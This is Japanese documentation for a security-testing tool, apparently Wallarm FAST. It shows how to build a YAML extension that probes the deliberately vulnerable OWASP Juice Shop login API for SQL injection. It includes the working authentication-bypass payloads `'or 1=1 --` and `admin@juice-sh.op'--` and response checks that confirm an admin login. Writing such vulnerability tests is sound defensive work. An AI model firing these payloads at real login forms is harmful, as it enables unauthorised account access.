[link-app-examination]:     app-examination.md
[link-points]:              ../points/intro.md
[link-using-extension]:     ../using-extension.md
[link-meta-info]:           ../create-extension.md#structure-of-the-meta-info-section

[doc-collect-phase]:        ../phase-collect.md
[doc-match-phase]:          ../phase-match.md
[doc-modify-phase]:         ../phase-modify.md
[doc-generate-phase]:       ../phase-generate.md
[doc-detect-phase]:         ../detect/phase-detect.md

[link-juice-shop]:          https://www.owasp.org/index.php/OWASP_Juice_Shop_Project


#   変更拡張の作成

このドキュメントに記載の拡張は、受信した基本のリクエストを変更し、ペイロードを注入します。このペイロードは、[OWASP Juice Shop][link-juice-shop] ターゲットアプリケーションのログインフォームにおけるSQLi脆弱性の攻撃につながる可能性があります。
  
##  準備

FAST拡張の作成に先立って、以下のステップを実行することを強く推奨します：
1.  拡張を作る対象となる[ターゲットアプリケーションの動作を調査してください][link-app-examination]。
2.  [拡張のポイント構築の原則を読むこと][link-points]。


##  拡張の作成

拡張を記述するファイル（例：`mod-extension.yaml`）を作成し、必要なセクションで埋めてください：

1.  [**`meta-info`セクション**][link-meta-info]。

    拡張が検出しようとする脆弱性の説明を用意してください。
    * 脆弱性ヘッダー: `OWASP Juice Shop SQLi (mod extension)`
    * 脆弱性説明: `Demo of SQLi in OWASP Juice Shop (Admin Login)`
    * 脆弱性タイプ: SQLインジェクション
    * 脆弱性の脅威レベル: 高
    
    対応する `meta-info` セクションは以下のようになります：
    
    ```
    meta-info:
      - type: sqli
      - threat: 80
      - title: 'OWASP Juice Shop SQLi (mod extension)'
      - description: 'Demo of SQLi in OWASP Juice Shop (Admin Login)'
    ```
    
2.  **`collect`セクション、[Collect phase][doc-collect-phase]**。
    
    ログインを試みる際に、REST APIの `POST /rest/user/login` メソッドが使用されます。
    
    ログイン用のAPIに送信される基礎リクエスト全てでテストリクエストを作成する必要はありません。それぞれのPOSTリクエストに含まれるデータに対して、脆弱性のテストは同じ方式で実施されるからです。
    
    拡張設定をAPIのログインリクエストを受け取ったときに一度だけ実行するようにします。これには、ユニーク性条件を持つCollectフェーズを拡張に追加します。

    ログインのためのAPIへの `/rest/user/login` リクエストは以下を含みます：

    1.  パスの最初の部分で、値は `rest`、
    2.  パスの二番目の部分で、値は `user`、そして
    3.  `login` アクションメソッド
    
    これらの値を参照する対応するポイントは次のとおりです：

    1.  パスの最初の部分の `PATH_0_value`
    2.  パスの二番目の部分の `PATH_1_value`
    3.  `login` アクションメソッドの `ACTION_NAME_value`
    
    これら三つの要素の組み合わせがユニークでなければならないという条件の追加を行った場合、拡張は初めてAPIに `/rest/user/login` ベースラインリクエスト（このリクエストはユニークと見なされ、その後のログインのためのAPIへのリクエストはそれがユニークでないため実行されません）が送信されたときにのみ実行されます。
     
    拡張のYAMLファイルに対応する `collect` セクションを追加します。 
    
    ```
    collect:
      - uniq:
        - [PATH_0_value, PATH_1_value, ACTION_NAME_value]
    ```

3.  **`match`セクション、[Match phase][doc-match-phase]**。
    
    送られてきた基本リクエストが本当にAPIのログインリクエストであるかを確認する必要があります。なぜなら、私たちが作成している拡張はログインフォームが持つ脆弱性を攻撃するからです。
    
    拡張は、基本リクエストが以下のURI：`/rest/user/login`に対象している場合にのみ実行されるように設定します。定められた要素を含んだリクエストを受け取ったかどうかを確認するMatchフェーズを追加します。これは以下の `match` セクションを使用することで行えます。

    ```
    match:
      - PATH_0_value: 'rest'
      - PATH_1_value: 'user'
      - ACTION_NAME_value: 'login'
    ```

4.  **`modify`セクション、[Modify phase][doc-modify-phase]**。
    
    以下の目標を達成するために基本リクエストを変更する必要があるとしましょう：
    * `Accept-Language` HTTPヘッダー値をクリア（この値は脆弱性の検出のためには必要ありません）。
    * `email` と `password` パラメータの実際の値を中立的な `dummy` の値に置き換える。
    
    拡張に以上の目標を満たすようにリクエストを変更する `modify` セクションを追加します。
    
    ```
    modify:
      - "HEADER_ACCEPT-LANGUAGE_value": ""
      - "POST_JSON_DOC_HASH_email_value": "dummy"
      - "POST_JSON_DOC_HASH_password_value": "dummy"
    ```
    
    !!! info "リクエスト要素の説明構文"
        JSON形式のリクエストデータは `<key: value>` ペアに保存されているため、 `email` 要素の値を参照するポイントは上記のようになります。`password`要素の値を参照するポイントも同様の構造を持っています。
        
        ポイントの構築に関する詳細情報は、この[リンク][link-points]を参照してください。
 
5.  **`generate`セクション、[Generate phase][doc-generate-phase]**。

    ターゲットアプリケーションのSQLインジェクション脆弱性を攻撃するために、基本リクエストの `email` パラメータの値を変更するべきペイロードが二つあることが既知です：
    * `'or 1=1 --`
    * `admin@juice-sh.op'--`
        
    !!! info "修正済みリクエストへのペイロードの挿入"
        ペイロードは、拡張が `modify` セクションを含んでいるため、以前に修正されたリクエストに挿入されます。したがって、最初のペイロードを `email` フィールドに挿入した後のテストリクエストのデータは次のようになります：
    
        ```
        {
            "email": "'or 1=1 --",
            "password":"dummy"
        }
        ```
    
        選ばれたペイロードのために任意のパスワードが成功するログインに使われるため、パスワードフィールドにペイロードを挿入する必要はありません。これは、Modifyフェーズが適用された後に `dummy` の値を持つでしょう。
    
        上記で議論した要件を満たすテストリクエストを作成する `generate` セクションを追加します。
    
        ```
        generate:
          - payload:
            - "'or 1=1 --"
            - "admin@juice-sh.op'--"
          - into: "POST_JSON_DOC_HASH_email_value"
          - method:
            - replace
        ```

6.  **`detect`セクション、[Detect phase][doc-detect-phase]**。
    
    次の条件が管理者権限でのユーザー認証が成功したことを示します：
    * レスポンスボディ内の、ショッピングカート識別子パラメータが `1` 値を持つ存在。このパラメータはJSON形式で、次のように見えます：
    
        ```
        "bid":1
        ```
    
    * レスポンスボディ内の、`admin@juice-sh.op` 値を持つユーザーの電子メールパラメータの存在。このパラメータはJSON形式で、次のように見えます：
    
        ```
         "umail":"admin@juice-sh.op"
        ```
    
    攻撃が上記に述べた条件に従って成功したかどうかを検証する `detect` セクションを追加します。
    
    ```
    detect:
      - response:
        - body: "\"umail\":\"admin@juice-sh.op\""
        - body: "\"bid\":1"
    ```
    
!!! info "特殊記号のエスケープ"
    文字列中の特殊記号をエスケープすることを忘れないでください。

##  拡張ファイル

ここで `mod-extension.yaml` ファイルには、拡張の操作に必要な全てのセクションが含まれています。ファイルの内容のリストが以下になります：

??? info "mod-extension.yaml"
    ```
    meta-info:
      - type: sqli
      - threat: 80
      - title: 'OWASP Juice Shop SQLi (mod extension)'
      - description: 'Demo of SQLi in OWASP Juice Shop (Admin Login)'

    collect:
      - uniq:
        - [PATH_0_value, PATH_1_value, ACTION_NAME_value]

    match:
      - PATH_0_value: 'rest'
      - PATH_1_value: 'user'
      - ACTION_NAME_value: 'login'

    modify:
      - "HEADER_ACCEPT-LANGUAGE_value": ""
      - "POST_JSON_DOC_HASH_email_value": "dummy"
      - "POST_JSON_DOC_HASH_password_value": "dummy"

    generate:
      - payload:
        - "'or 1=1 --"
        - "admin@juice-sh.op'--"
      - into: "POST_JSON_DOC_HASH_email_value"
      - method:
        - replace

    detect:
      - response:
        - body: "\"umail\":\"admin@juice-sh.op\""
        - body: "\"bid\":1"
    ```

##  拡張の使用

作成した拡張の使用方法についての詳細情報は、[このドキュメント][link-using-extension]を参照してください。